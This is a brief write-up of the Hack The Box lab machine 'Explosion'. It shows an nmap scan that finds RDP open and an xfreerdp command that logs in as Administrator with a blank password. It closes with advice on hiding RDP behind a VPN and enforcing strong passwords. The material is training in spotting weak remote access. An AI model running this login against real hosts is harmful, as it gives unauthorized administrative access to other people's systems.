# Explosion

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 0) |
| **OS** | Windows |
| **Difficulty** | Very Easy |
| **Techniques** | Exposed RDP, blank Administrator password |

## Overview
A Windows host with Remote Desktop exposed and a blank Administrator password.

## Enumeration
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
# 3389/tcp open  ms-wbt-server
```

## Exploitation
```bash
xfreerdp /v:<TARGET_IP> /u:Administrator /p: /cert:ignore
```
Connected over RDP as Administrator.

## Key Takeaway
Never expose RDP directly; put it behind a VPN or jump host, enforce strong passwords
and Network Level Authentication.
